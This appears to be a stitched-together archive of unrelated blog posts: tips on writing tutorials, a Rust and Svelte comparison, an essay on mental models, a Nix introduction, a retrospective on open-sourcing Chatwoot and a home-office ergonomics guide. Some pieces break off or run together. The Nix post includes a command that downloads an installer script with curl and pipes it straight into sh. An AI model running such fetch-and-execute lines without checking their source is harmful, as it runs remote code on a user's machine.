<li>When done with this step, you should be able to follow your tutorial and build the example project.</li>
</ul>
<h3>7. Spruce up the rough draft</h3>
<ul>
<li>Add in any explanations, quotes, humor, flair, nuance, etc. that you want - here you’re polishing up the rough draft.</li>
<li>Usually it’s nice to start a tutorial with some context for the reader - who this tutorial is for, why you are
writing it, any prerequisite knowledge needed, etc.</li>
<li>This is also a good time to add any links you’ve found helpful - they can be inline, or compiled at the beginning
or end for further reading.</li>
</ul>
<h3>8. Walk through the tutorial like you’re the reader</h3>
<ul>
<li>This is like doing QA for your tutorial.</li>
<li>Follow the tutorial as though you have no prior knowledge/experience with the material. Try to uncover any areas or
steps where a reader could be confused - you might be taking a certain piece of info for granted!</li>
<li>Revise, reorder, fix, etc. as you come across issues.</li>
</ul>
<h3>9. Publish!</h3>
<p>Could be your own blog, on Medium, in a publication that accepts outside submissions - just as long as it gets out
there in the world for folks to benefit from.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main"><article>
  
  <div><p>If you’ve ever met me or read this blog, you know that I have a soft spot for the <a href="https://www.rust-lang.org/">Rust programming language</a>. I’m also excited about and interested in <a href="https://svelte.dev/">Svelte</a>, a declarative and reactive web framework. In this blog post I will explain how these two completely different technologies are actually quite similar and why these similarities are what make them great.</p>

<p>Let’s start by talking about Rust. I could write several blog post about all of Rust’s excellent features, in fact I am planning to, but for now let’s focus on its most important feature: <a href="https://doc.rust-lang.org/rust-by-example/scope/lifetime.html">lifetimes</a>. Lifetimes are Rust’s most unique and innovative feature and they are the solution to several problems that are nearly as old as programming itself. These problems all relate to managing memory and safe access to that memory. To understand why lifetimes are so important we need to understand how memory has been managed historically.</p>

<p>The earliest programming languages left memory management up to the programmer, but it didn’t take long for systems to be created that took this responsibility out of the programmer’s hands. Lisp was the language that introduced the concept of an <a href="https://en.wikipedia.org/wiki/Garbage_collection_(computer_science)">Automatic Garbage Collector</a>, GC for short, and since its inception different forms of GC has been staple features of most popular programming languages. GC is an important innovation but it’s not free. All GCs come with a nontrivial runtime cost. This has made them, and the languages that use them, undesirable for many tasks, such as operating systems, games, and other realtime systems. For these task the indeterministic nature and high runtime cost are unacceptable; for example we cannot afford to stop the world for several milliseconds when the task at hand requires sub-millisecond precision. For these use cases C, C++, and other languages with manual memory management still reign supreme. It turns out, despite what some programmers say, that humans are terrible at manually managing memory. The consequence of errors in manual memory management range from crashes and data corruption, to information leaks and remote code execution. Microsoft has found that about <a href="https://www.zdnet.com/article/microsoft-70-percent-of-all-security-bugs-are-memory-safety-issues/">70% of their security bugs</a> are due to errors in manual memory management.</p>

<p><a href="https://hugotunius.se/img/why-svelte-is-like-rust/memory-safe-venn-diagram.png"><img src="https://hugotunius.se/img/why-svelte-is-like-rust/memory-safe-venn-diagram.png?1597500852" alt="Venn Diagram with two circles, the first labelled &quot;Memory Safe&quot; and the second labelled &quot;Deterministic&quot;. The overlap between them is labelled &quot;Rust&quot;"></a></p>

<p>So back to lifetimes. They enable the compiler to determine <strong>at compile time</strong> when memory can be <strong>safely</strong> freed and reused. After compilation Rust code ends up kind of like C code written by a perfect programmer who makes no mistakes and knows exactly where to insert calls to <code>free</code>. The compiler can also use lifetimes to ensure that the code is correct and avoids common concurrency bugs in the presence of multiple threads. In conclusion, Rust solves the complex problem of memory management, while retaining the deterministic runtime performance required for many tasks that we typically associate with C and C++.</p>

<blockquote>

</blockquote>

<p>Let’s switch gears and talk about the web a bit. When I started working as web developer Javascript heavy applications where just starting to gain popularity. Back then, one would write applications in “vanilla Javascript”(<a href="https://en.wikipedia.org/wiki/ECMAScript#5th_Edition">ES5</a>) usually with <a href="https://jquery.com/">jQuery</a>. As complexity moved from the server side to the client, a class of bugs started occurring with the underlying cause of application state ending up out of sync with the <a href="https://en.wikipedia.org/wiki/Document_Object_Model">DOM</a>. This hadn’t been a problem in server side rendered applications, because every state change involved rendering a completely new page from the current state. With client side applications one would write code to alter the DOM based on every state change, add a class here, remove an element over there etc. This approach was fraught with issues and almost always caused the afore mentioned bugs.</p>

<p>Several client side libraries started popping up to try and tackle the issue of keeping state and UI in sync. <a href="https://knockoutjs.com/">Knockout</a>, <a href="https://backbonejs.org/">Backbone</a>, and <a href="https://emberjs.com/">Ember</a> where some of these libraries. <a href="https://angularjs.org/">Angular</a> from Google was also released around the same time. In common these libraries had the idea of two-way data bindings which would automatically keep the DOM in sync with changes to the underlying state and vice-versa. Still, these libraries didn’t solve the problem completely.</p>

<p>It would be great if we could, like on the server side, simply re-render our whole application in response to every single state change, but this would be extremely computationally expensive and would result in unacceptable performance. This notion of re-rendering in response to every state change is the idea that underpins <a href="https://reactjs.org/">React</a>, which was released in 2013. React got around the performance issues inherent in re-rendering the whole application with <a href="https://reactjs.org/docs/faq-internals.html">Virtual DOM</a>. Virtual DOM is an in memory representation of the DOM itself which React uses to determine a small set of changes that can be applied to the real DOM in response to every state change. The Virtual DOM was the crucial invention that made React a huge step forward for the web ecosystem. As an application developer one could “re-render” the whole application in response to every single state change and React would take care of making the desired changes to the underlying DOM.</p>

<figure><pre><code data-lang="plain">// With React UI could
// be treated as a pure function of state
state =&gt; UI</code></pre></figure>

<p>React is of course not entirely free, to determine the small set of changes to make to the DOM it has to <a href="https://reactjs.org/docs/reconciliation.html">reconcile</a> two Virtual DOMs on the client side. If we squint a bit, automatic garbage collection and the Virtual DOM are kind of similar, they are both runtime solutions to problems programmers just weren’t up to solving correctly and consistently. So what’s the <em>lifetimes</em> of web frameworks? You’ve probably guessed it, it’s Svelte!</p>

<p>Svelte takes a similar approach to React and other frameworks that use a Virtual DOM, it’s both reactive and declarative. However, just like Rust does automatic memory management at compile time, Svelte determines the possible changes to DOM based on the possible state changes at compile time. With Svelte we get the benefits of React et al. without the downside of client side reconciliation that taxes performance.</p>

<p><a href="https://hugotunius.se/img/why-svelte-is-like-rust/client-side-state-venn-diagram.png"><img src="https://hugotunius.se/img/why-svelte-is-like-rust/client-side-state-venn-diagram.png?1597500852" alt="Venn Diagram with two circles, the first labelled &quot;Free from state bugs&quot; and the second labelled &quot;Optimal performance&quot;. The overlap between them is labelled &quot;Svelte&quot;"></a></p>

<h2 id="hard-problems-at-compile-time">Hard Problems at Compile Time</h2>

<p>So why is Svelte like Rust? Svelte is like Rust because it solves a problem that programmers are clearly not capable of solving themselves <strong>at compile time</strong>. It’s not all sunshine and rainbows however. As I mentioned at the top I haven’t yet used Svelte, but with Rust long compiles times are a significant problem. When we solve complex problems at compile time the complexity of compilers naturally increases and we pay the price of longer compile times for our runtime gains. Luckily there’s lots of <a href="https://blog.mozilla.org/nnethercote/2019/10/11/how-to-speed-up-the-rust-compiler-some-more-in-2019/">work</a> happening to improve the compile times of the Rust compiler.</p>

While onboarding Rishi, Steve had him create a User Manual as “being part of a high-performing team includes regularly self-reflecting and jotting down some of those musings on paper so we know how to best work with each other.” </p><p>The Personal User Manual Template can be found <a href="https://www.notion.so/User-Manual-Template-c0a659a5adf244d3bc8e61e7143063d9">here</a> if you wish to complete your own. I would highly recommend the process as it saves time, allows the people you work with to quickly understand you and forces you to undergo introspection. As I have begun to meet other people on the internet, it has become habitual to forward them this manual if they wanted to collaborate on a project or just to make an introduction. </p><blockquote><p>By reducing the friction of making introductions, you increase your surface area for serendipity on the internet. </p></blockquote><p>I decided to share this exercise with my audience to help them improve, but also creating a live web-page where this can be <strong>continually iterated</strong>. </p><p>Another recommendation I would have is to share the manual with friends and family, it is not solely isolated for use over the internet.

Use your up days to evaluate what went well, use your down days as motivation to push forward. </p></li><li><p>Write down everything that interests you.

August 15, 2020 | https://www.brandonzhang.com/blog/mental-models | <a href="https://web.archive.org/web/*/https://www.brandonzhang.com/blog/mental-models">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-93721eb4371f185371ed"><div><p>Productivity has somehow jumped from economists’ toolbox to every online creator’s bio.&nbsp;</p><p>I know because I had it in mine. Talking about productivity offered the luxury of a wide array of topics to pick from and a seemingly universal audience. I mean, who wouldn't want to learn how to be more efficient and effective? However, as I began to continue to publish and iterate, I realized that the majority of "productivity-related" content seemed to follow one singular trend: Grind and hustle.&nbsp;</p><p>I felt there was a missing piece. I believe in sustainable and mindful productivity. But we are surrounded by a hectic, competitive environment that frowns upon resting, breathing and enjoying oneself.</p><p>Mindful productivity is the process of prioritizing sustainable practices of thinking, creating, and making. Mindful productivity prioritizes the efficiency of our work and the freedom of our time, leading others to obsess over the concept of “flow.”&nbsp;</p><p>Normally when you hear about flow, it elicits a warm feeling, as you think of the flow state and free-flowing ideas. However, the bane of mindful productivity is <strong>flow paralysis</strong>.</p><p>Flow paralysis is when you lose agency in your life and begin to fall in an endless habitual loop. You are so lost within the momentum of daily progression, that you lose sight of the end goal. You fail to consider that you and the world are changing, while your actions stay the same.&nbsp;</p><p>You go with the flow.&nbsp;</p><h3><strong>The Magic of Mental Models</strong></h3><p>This is where mental models come in. They are the safety nets that prevent you from falling into flow paralysis, the lightning bolts that jolt you out of complacency,&nbsp; a new lens for you to look at yourself.&nbsp;</p><p>Mental Models are the frameworks that guide our understanding of the world. In the age of abundance, where over 547,200 web pages are created every day, we need ways to simplify the complex systems. Mental Models act both as a filter and a lens. They maintain what information is necessary and then display that information in chunks or buckets that you can easily process.</p><p>We subconsciously develop mental models as we learn and grow from birth. The power is in learning to consciously build and add these models into our toolkit. There can be a fundamental evolution in our world view and perspective simply by being aware and taking control of our mental models.&nbsp;</p><p>I am still learning to use and synthesize all the Mental Models in the world. You can read about them and understand them, but until you instill them in your weekly and daily routines and habits, they will continue to live in your subconscious. Until you bring them to the forefront of your mind, allowing them to challenge your worldview, can they truly counteract the influences of the flow state.&nbsp;</p><p>I have selected the three mental models that have provided me with the highest leverage after I have begun to actively implement them in my day-to-day life. Use them to discern the signals in your life from the noise.&nbsp;</p><h3><strong>1.Regret Minimization</strong> - Pursue the projects and opportunities that you will have regretted not having pursued when you look back at your life.&nbsp;</h3></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1597339833769_15005"><div><p>Long-term happiness is the subtraction of regret from our lives. The dopamine hits of audience growth, financial success, and platitudes from others can temporarily fill us with excitement and joy. We are not programmed to think in the long-term, short term gains can easily overpower our internal operating system and throw off our calculations.&nbsp;</p><p>It’s hard to look ten years in the future and learn about what we wished we accomplished, instead I have incorporated questions in my weekly review to give me the opportunity to refocus my intention.&nbsp;</p><ul data-rte-list="default"><li><p>Am I taking steps that drive me closer to freedom? What were they?</p></li><li><p>Am I putting anything off? Is this because I am not interested in it or because I was not mentally strong enough to face it?</p></li><li><p>Are my actions in line with my monthly and annual objectives?</p></li><li><p>Do I have any changes I want to make to my monthly and annual objectives? If so, why (convince yourself)?</p></li></ul><p>Some weeks, I breeze through these answers, there have been no major shifts with what I have been doing. Other weeks, there are clashes between where I currently am and where I want to be. Having a consistent practice cuts through the noise.&nbsp;</p><h3><strong>2. Inversion</strong> - Addressing problems and scenarios by thinking about them backward.&nbsp;</h3><p>Inversion thinking is like a round-trip drive. On the first leg, you observe the major landmarks and scenes around you. Typically we think of the future in a forward way, addressing our desires and aspirations. We ask things like:&nbsp;</p><ul data-rte-list="default"><li><p>How can I have a good life?&nbsp;</p></li><li><p>How can I lose weight?&nbsp;</p></li><li><p>How can I make money?&nbsp;</p></li></ul><p>On the return leg of the round trip, it is a completely different experience. Although the route is unchanged, the opposite direction will allow you to see a completely new landscape.&nbsp;</p><p>Inversion is the process of working through your problems backwards. Inversion places you in the mindset of avoiding rather than achieving. Let’s apply inversion thinking to the three questions above:&nbsp;</p><ul data-rte-list="default"><li><p>How do I <strong>not</strong> have a good life? -&gt; How do I guarantee a bad life?</p></li><li><p>What would I do to <strong>not</strong> lose weight? -&gt; How do I guarantee I am out of shape?</p></li><li><p>How would I <strong>not</strong> make money? -&gt; How do I avoid becoming wealthy?&nbsp;</p></li></ul><p>Usually the problems we face in life are caused by things we are <strong>already doing</strong>, not things that we need to do. You sleep poorly because you check our phone right up until we go to bed, not because you have not purchased the latest Oura ring. You feel lazy and unmotivated because you never exercise, not because you haven not read the latest book by <a href="https://www.calnewport.com/">Cal Newport</a>.&nbsp;</p><p>When you approach a new problem, approach it with the following process:&nbsp;</p><ol data-rte-list="default"><li><p>Write down the problem you are trying to solve.&nbsp;</p></li><li><p>Invert the problem.&nbsp;</p></li><li><p>Expand on the inversion to specific actions that you need to avoid.&nbsp;</p></li><li><p>Avoid said actions.&nbsp;</p></li></ol><p>Here is an example model:&nbsp;</p><p><strong>Original goal:</strong> How do I lose weight?&nbsp;</p><p><strong>Inversion:</strong> How do I guarantee being out-of-shape?&nbsp;</p><ul data-rte-list="default"><li><p>Operating at a caloric surplus.&nbsp;</p></li><li><p>Having unbalanced macros.&nbsp;</p></li><li><p>Reducing all activities that require energy and movement.&nbsp;</p></li></ul><p>We are always told to “look at things from a different angle or perspective.” Inversion forces this upon us. It is counterintuitive and challenges our own beliefs, forcing us to take time with a decision. Instead of deciding you need to get a new exercise plan or hire a new personal trainer for the tenth time, you might finally realize that change starts from within. You realize that you need to stock your fridge with healthier options, track your diet and stay active regularly instead of depending on an exercise plan to be the “fix-all.”&nbsp;</p><p>That is the power of new perspective.&nbsp;</p><h3><strong>3. Pareto Principle</strong> - 80% of your total output in a field is determined by 20% of your inputs.&nbsp;</h3><p>Everyone knows this principle as the 80-20 rule. You are told to “80-20” something when the gurus want you to apply the Pareto Principle. We often assume that the equation where 80% of our outputs are affected by 20% of our inputs are locked in. However, the biggest stopping point for most people is pausing on execution because they want to use numbers to calculate the amounts of their work that fit the Pareto equation.</p><p>This is absurd.&nbsp;</p><p>The idea behind the use of the numbers 80% and 20% is that they are the most commonly observed outcome and should serve as a goalpost for people. The simple end goal is to determine whether there is a <strong>minority</strong> input that is affecting a <strong>majority</strong> output. There are scenarios where there are no statistical points to make calculations. How can you differentiate between 80% happiness and 60% happiness?&nbsp;</p><p>In the end, it’s a gut feeling.&nbsp;</p><p>To be more conscious with the Pareto mental model, I have implemented a daily practice within my to-do list. Above all the smaller tasks, I now always have a “daily highlight,” a non-negotiable, high-leverage task that leads to <strong>majority output</strong>.&nbsp;</p><p>I ask myself, what is the highest priority task that will yield the largest results?&nbsp;</p><p>It could be finishing the first draft for the long-form essay you have put off to watch the NBA Bubble matches.It could be creating a project roadmap for your team. It could be spending the day cold emailing prospective mentors. Generally, the highest priority tasks also have the highest energy requirement. In the past, this meant that I would opt to complete <strong>low-leverage</strong> “busy work” ahead of it, draining my energy so that when I got started on the <strong>high-leverage</strong> task, I was not as effective.&nbsp;</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1597339833769_5036"><div><p>Akin to the division of [BC] and [AD] of the Gregorian Calendar, there is a similar distinction in my life where there was a period before I became aware of Mental Models and a period after.&nbsp;</p><p>Previously, if I had been offered a ghost-writing opportunity with good pay, I would have taken the assignment regardless of the topic. After learning about inversion and regret minimization, I began to focus more on my personal projects that allowed me to grow and learn (ie. the <a href="https://www.brandonzhang.com/podcast">podcast</a>, working for <a href="https://shop.visualizevalue.com/">Visualize Value</a>).&nbsp;</p><p>I was recently approached to write an article on the differences between Notion and OneNote, I decided to turn it down. The topic and style of writing did not speak to my personal interests, I felt forced to work with SEO keywords and restrained in the writing I was delivering. I asked myself, would I regret doing this in the future? The answer, yes. I asked myself, is this a high leverage task? The answer, no. I realized that there was a lot more value to be earned speaking with guests on my podcast and networking with people on Twitter.&nbsp;</p><p>On a weekly and daily basis, I have checks in place that force me to consciously apply these mental models. Everyone recommends completing weekly reviews, but applying the frameworks of the Pareto Principle, Regret Minimization and Inversion will lead you to be more thoughtful about your life and your future.&nbsp;</p><p>I am working through the list of mental models in this <a href="https://www.notion.so/Mental-Models-a222ae61d8b8427b98099a8fbe72ce85"><span>Notion database</span></a>, looking for more tools to add to my toolbox in the fight against <strong>flow paralysis</strong>.&nbsp;</p><p>Wrest control of your future by taking control of your thinking.&nbsp;</p><p>You can …</p></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Nix is a package management language that has a massive ecosystem about solving DevOps problems.</p>

<p>Nix, is a functional and domain-specific programming language. Nix also is a package manager for Linux and Unix based systems like aptitude and brew.</p>

<p>But, not just for a single system. It's an independent package manager. So you can use Nix to manage system packages or your language packages. You can install Nginx with Nix, and you can install <code>is_array</code> npm package, or you can install <code>HTTPBundle</code> for Symfony, or you can manage your Python packages. Also, you can install different versions of the same package to the same environment.</p>

<p>There is a ton of usage area of Nix. Also, Nix has a great ecosystem for developers. You can use NixOS if you want to manage your whole system via Nix, and you can use NixOps if you are going to build your applications to a network.</p>

<p>Today I will show you a simple introduction about Nix. I planned a Nixops introduction and “[how you can deploy a real Symfony application via Nixops]()” titled article. I'll share it soon.</p>

<p>As I said, you can manage your system packages with Nix. Just install Nix your Linux or macOS; (You have to root access for install the nix.)</p>

<pre><code>curl -L https://nixos.org/nix/install | sh
</code></pre>

<p>That command installs the <code>nix-env</code> tool to your system. You can use nix like <code>brew</code> or <code>apt</code> with that command.</p>

<p>You can get an installable packages list with <code>nix-env -qa</code> command; also, you can check an <a href="https://nixos.org/nixos/packages.html" rel="nofollow">online tool</a> for searching packages.</p>

<p>You can install packages with <code>nix-env -i hello</code>  command. <code>-i</code> argument for <code>install</code></p>

<p>Check your package installed directory via <code>which hello</code> command. It will produce a result like that on Linux: <code>/home/delirehberi/.nix-profile/bin/hello</code></p>

<p>You'll get a <code>Hello, World!</code> respond when you run <code>hello</code> command. You can also install firefox with <code>nix-env -i firefox</code> command.</p>

<p>Nix is a purely functional programming language. So you have only pure functions. And all your functions just gave a single argument. There is an example Nix function; <code>x: x*2</code> is a function that gets an integer and returns the product with 2.  I will not give a language lesson. You can read <a href="https://nixos.org/nixos/nix-pills/basics-of-language.html" rel="nofollow">nix-pills</a> for it.</p>

<p>You can write your build script with Nix language. Nix repository contains a lot of derivations for a ton of packages. Every time you want to install a package, a derivation will work and build that application in your system with precisely valid dependencies. You will not see dependency related errors. If an application needs the<code>curl</code> library, it will install as independently.</p>

<p>You can read about Nix in the <a href="https://nixos.org/" rel="nofollow">official</a> web site. Also, I'll write different Nix and Nixops documents for the PHP ecosystem in this blog.</p>

<p>Keep yourself healthy!</p>

August 15, 2020 | https://www.chatwoot.com/blog/woot-journals-one-year-since-open-sourcing-chatwoot/ | <a href="https://web.archive.org/web/*/https://www.chatwoot.com/blog/woot-journals-one-year-since-open-sourcing-chatwoot/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Looking into the one year of open-sourcing Chatwoot.</p><div><p>Chatwoot is now one of the most popular open-source live chat software on Github. If you haven’t been following the story so far, here is the story, in a nutshell, to get you started. </p>
<p>Chatwoot started as a commercial project in 2016 and strived to help businesses provide exceptional customer support through Facebook messenger. The product inspiration came through the customer pain points which we observed while working in this space as a part of our previous gigs. Nevertheless, the project didn't culminate into a viable business and we shut shop in 2017. </p>
<p>With the amount of sweat we put into the project, Chatwoot still stayed alive in our hearts. In 2019, as an impromptu decision, we ended up open-sourcing the project as a part of the #hacktoberfest. The story took a different twist then and Chatwoot went on to be a top post on Hackernews. Ever since then, the project has been growing at an incredible pace with almost 5k stars on Github currently. </p>
<p>Today marks a year since the initial commit for Chatwoot’s resurrection as an open-source project and so let's take a step back to look at Chatwoot's journey in the last year.   </p>
<h2 id="the-decision-to-go-open-source"><a href="#the-decision-to-go-open-source" aria-label="the decision to go open source permalink"></a>The Decision to go open-source</h2>
<blockquote>
<p>How do you start a popular open-source project?   </p>
</blockquote>
<p>Over the last year, we might have told our story countless times. However, often, the larger story fails to capture the minute moments and the thought processes behind deciding to go open-source. Many a time, we have felt that the Chatwoot story as an answer to the question <code>How did you decide to go open-source?</code>  leaves the questioner unsatisfied. That said, in all honesty, there was never a grand scheme behind the decision. </p>
<p>In the second quarter of 2019, the core Chatwoot team was back together prototyping yet another SaaS product. It was in one of our regular sync-up calls that <a href="https://twitter.com/pranavrajs">@pranavrajs</a> floated the idea of making Chatwoot open-source. The idea didn’t attract any criticism, but there wasn’t too much enthusiasm in the air either, thanks to our Imposter Syndrome.  </p>
<p>Our experience in open-source till that point was limited to being consumers. Being ardent fans of the code quality in open source projects like Vue.js and ruby on rails, we had our insecurities exposing the project to the whole world.  </p>
<p>With zilch expectations, we went through it like just another day in our lives and decided to commit the codebase to GitHub. We would leave it there while the team continued working on our next big thing, we had thought! ;).   </p>
<h2 id="ignition-ready-set-go"><a href="#ignition-ready-set-go" aria-label="ignition ready set go permalink"></a>Ignition: Ready Set Go</h2>
<p>In August 2019, as unprepared as we were, Chatwoot codebase was brought out as a public repo. Our expectation of an uneventful day, quickly turned around, thanks to the spammers who got hold of an SES key from an old commit. The incident ended in raking up quite a surprise in the form of AWS billing alerts. We did act swiftly to mitigate the issue, but as far as the business plan behind open source goes, This is the story.</p>
<p>October saw the repo getting some attention thanks to #hacktoberfest, which re-kindled the whole team's interest in Chatwoot. It even resulted in the team deciding to put on-hold the then on-going project and give Chatwoot our full attention for the next 2 months. We did the much-needed maintenance chores over the repo and ended up shipping the website live chat feature that we lacked in. The absence of other communication channels, especially website live chat, was one of our prime hypotheses behind the earlier failure of Chatwoot. Having been able to ship that feature in 2 weeks, amidst the newfound enthusiasm, is something the team is still extremely proud of.   </p>
<p>The ultimate unexpected kickstart, however, came in December in the form of <a href="https://news.ycombinator.com/item?id=21559197">Hackernews</a>, which we attribute as the start of Chatwoot as a serious open-source business.</p>
<p>After Hacktoberfest, we saw the attention on our GitHub repo reducing despite the team shipping new updates. In all helplessness,  <a href="https://twitter.com/pranavrajs">@pranavrajs</a> gave it a final go on ShowHN one night and to our joy, we were received with much love from the community, a wonderful surprise for the whole team, and a sleepless night for <a href="https://twitter.com/pranavrajs">@pranavrajs</a>, replying to comments. Chatwoot hasn’t stopped growing ever since. </p>
<h2 id="almost-a-year-later"><a href="#almost-a-year-later" aria-label="almost a year later permalink"></a>Almost a year later</h2>
<blockquote>
<p>The work that the Chatwoot community does, matters!</p>
</blockquote>
<p>Despite the adversities since the beginning of 2020, the Chatwoot community continues to generate moments that have carried us through these tough times. Working in isolation from a remote corner of the world, you might fail to see the impact you are creating, but testimonies like the following make us realize why we matter as a community.  </p>
<blockquote>
<blockquote>
<p>"I’m so glad I found your software. It’s a tremendous help for startups like me who, because of the global pandemic, had to shift from a physical store to online selling through social media. You guys will save my store as well as the jobs of my employees as we are now about to be efficient in addressing our customers’ inquiries. Again, I’m grateful. "</p>

  <div>
    <div>
      <article role="main">
        <p>The headlines don’t lie.
<a href="https://www.crn.com/news/mobility/microsoft-extends-work-from-home-option-through-january">Microsoft</a>, <a href="https://www.cnn.com/2020/07/27/tech/google-work-from-home-extension/index.html">Google</a>, <a href="https://www.theverge.com/2020/7/15/21326017/amazon-work-from-home-extend-january-2021-corporate">Amazon</a>, <a href="https://www.cnbc.com/2020/08/06/facebook-will-allow-employees-to-work-remotely-until-july-2021.html">Facebook</a>, and a whole host of other tech companies have announced employees will be working from home until early-mid 2021.
There are reasons to believe this will be pushed back; even if the <a href="https://blogs.sciencemag.org/pipeline/archives/2020/04/15/coronavirus-vaccine-prospects">staggeringly ambitious</a> timelines for vaccine development are met, <a href="https://www.cbc.ca/player/play/1772035651845">a vaccine might not be a silver bullet</a> and the pandemic could require management for the next 2-3 years.
As a software engineer in big tech’s orbit, this means it’s time to settle in for the long haul and take my home work setup seriously.</p>
<p>I’ve been very concerned with ergonomics ever since early-career wrist issues had me mousing with my non-dominant hand for six months.
One of my university friends had such terrible pain that he became a pioneer in <a href="https://livestream.com/internetsociety3/hopeconf/videos/131671656">open-source speech recognition for programming by voice</a> (although his issues didn’t turn out to be from repetitive stress injuries).
All of which is to say I haven’t used a non-ergonomic keyboard or mouse in about a decade.
Still, my home setup, while decent, fell short in a few crucial areas.
It was time to make some improvements - I’m in this career for the long run.
Join me on this somewhat self-indulgent journey!</p>

<p>My top-level aims were as follows:</p>
<ol>
<li>Create a setup where I’m happy &amp; comfortable working for long periods of time</li>
<li>Create a setup which will not cause injury in the mid to long term</li>
</ol>
<p>To facilitate these aims, I chose these constraints:</p>
<ol>
<li>Focus on basic uncomplicated ergonomics, anchored in <em>adjustability</em></li>
<li>Prioritize <em>frugality</em> by buying used, and only buying features I definitely need</li>
<li>Avoid falling into the <em>consumerist perfection trap</em></li>
</ol>
<h3 id="ergonomics--adjustability">Ergonomics &amp; Adjustability</h3>
<p>When it comes to ergonomics, the science isn’t complicated; here’s how you get the biggest bang for your buck:</p>
<ol>
<li>Set the relative height of your chair &amp; desk so that you type &amp; mouse with straight wrists (not flexed up or down)</li>
<li>Reduce wrist pronation (inward twisting) by using a split/tented keyboard and vertical mouse or trackball</li>
<li>Ensure monitors are placed high enough so you can see them without sagging your neck forward (this is a big drawback with laptops)</li>
</ol>
<p>All the rest of it - standing desks, exotic chair designs, desk treadmills, mechanical keyswitches, keyboard trays, gas spring monitor arms - are basically a huge waste of time &amp; money if you can’t nail these three basic things.
I’m not going to spend time on good posture because that falls in the domain of flossing &amp; working out every day: if you want to do it, you’ll do it.
Programmer’s slouch can even be accomodated to a degree:</p>

<p>
  <iframe src="https://www.youtube.com/embed/LXYLVbt7j7o" allowfullscreen="" title="YouTube Video"></iframe>
</p>

<p>Regarding adjustability, we’ve all probably heard the tale of how the USAF designed its airplane cockpits for “average” body dimensions, with the end result that <a href="https://www.thestar.com/news/insight/2016/01/16/when-us-air-force-discovered-the-flaw-of-averages.html">literally nobody exactly fit those designs</a>.
This informs our approach here: prioritizing adjustability over other concerns like “quality” or whatever. Everyone reading this post will have body dimensions purely unique to themselves, and mere inches can make a difference.</p>
<h3 id="frugality">Frugality</h3>
<p>Buy used. Not complicated.
Computing equipment depreciates like milk left out in the sun, so you can snag perfectly good five-year-old equipment for 75-80% off MSRP.
Check Craigslist first (or Facebook Marketplace), then eBay.
I’ve been doing this for years and haven’t been burned once.
Single-core CPU performance <a href="https://www.cpubenchmark.net/year-on-year.html">has been flat for almost a decade now</a>; you probably don’t really need the latest &amp; greatest to do your work.
Also, most ergonomic equipment is built like a tank and can easily stand the test of time &amp; use.</p>
<p>The second component to frugality is much more subjective, but basically amounts to not buying what you don’t really need.
A great example here is a <a href="https://youtu.be/__K4V8pFhf4">$25 generic metal bolt monitor stand vs. $300 gas spring monitor arms</a> from Ergotron:</p>

<p>
  <iframe src="https://www.youtube.com/embed/__K4V8pFhf4" allowfullscreen="" title="YouTube Video"></iframe>
</p>

<p>If you’re like me, once your monitors are in the appropriate position they’re basically never touched again.
Buying a fancy gas spring stand would be a complete waste of money.
The example makes it sound simple, but it’s really easy to forget this as you’re watching flashy product videos.
Buying stuff is fun!
Which leads into our next constraint…</p>
<h3 id="the-consumerist-perfection-trap">The Consumerist Perfection Trap</h3>
<p>This is best illustrated by a YouTube comment I found under <a href="https://www.youtube.com/watch?v=LALQsqZP1nA">a Linus Tech Tips video</a> reviewing the very expensive Ergodox split mechanical keyboard:</p>
<figure>
    <img src="https://ahelwer.ca/img/ergonomics/ergodox-youtube-comment.PNG"> 
</figure>

<p>Humans are endlessly adaptable, for better or worse.
Before setting out, know this: you might sink days of research and thousands of dollars into your work setup, but it will never be quite perfect.
Just accept this. Live with it.
It’s called <a href="https://en.wikipedia.org/wiki/Hedonic_treadmill">hedonic adaptation</a>.
Even if your monitors end up an inch too close to your face, remember that the whole setup is <em>massively</em> better than sitting at your kitchen table or couch with a laptop.
Buying things is fun, and spending money begets spending more money.
It’s a good idea to let a setup sit for a couple weeks or a month before rushing off with further tweaks &amp; improvements.</p>
<p>Inside us all there is a void.
People want to complete themselves and fill this void with spirituality, or hedonistic pursuits, or material things.
If you’ll indulge a metaphor, this is not a void that can be filled - its nature is more akin to a black hole of the cosmic variety.
Feeding it things - for example, expensive ergonomic equipment - will simply add to its mass and pull.
Only if left alone might it slowly evaporate.
You must learn to live with it.
Materialism is the belief that something outside yourself will finally bring you permanent satisfaction, and we don’t want to be materialistic.</p>
<p>Just remember why you’re doing this: to facilitate work and avoid injury.</p>

<p>The main event. Here’s what I ended up getting.</p>
<h3 id="desk-uplift-v2-motorized-adjustable-standing-desk">Desk: UPLIFT V2 motorized adjustable standing desk</h3>
<p>This one hurt the most: it cost $835!
I’d been spoiled with a motorized adjustable standing desk while working at Microsoft, and was loathe to give it up.
I ended up springing for an uplift desk because it drives me crazy when things are wobbly, and many standing desks are allegedly quite wobbly if you’re a taller person.
I bought a <a href="https://www.upliftdesk.com/uplift-v2-standing-desk-v2-or-v2-commercial/">very basic uplift desk model</a>: 60x24” white laminate with just the memory pad and power grommet added on.
No way was I going to find something like this on the used market, sadly.
Buy once, cry once.
It came with a very nice cushy mat which really does improve the standing experience.</p>
<figure>
    <img src="https://ahelwer.ca/img/ergonomics/uplift-desk.jpeg"> 
</figure>

<p>If you’re looking to save money here and don’t mind buying the motorized legs &amp; desk top separately, there are allegedly <a href="https://lobste.rs/s/fvnhyd/taking_my_home_work_setup_seriously#c_sj3n6z">good deals to be had on Monoprice</a>.</p>
<h3 id="chair-haworth-zody">Chair: Haworth Zody</h3>
<p>Here’s where I got a pretty good deal.
Forget Herman Miller: their chairs still go for crazy prices used, but one can easily find a gently-used <a href="https://www.haworth.com/na/en/products/stools/zody-1.html">Haworth Zody</a> for $200 (vs. $1400 new) on Craigslist in any large-ish metropolitan area.
I also grew used to these while working at Microsoft, and it’s a truly wonderful high-quality chair - and very adjustable!
You can change seat height, seat depth, tilt tension (or lock it from leaning back), lumbar support height, and armrest position along all axes (height, side-to-side, forward/backward).</p>
<figure>
    <img src="https://ahelwer.ca/img/ergonomics/haworth-zody.jpg"> 
</figure>

<p>If you’re buying used you should test two things.
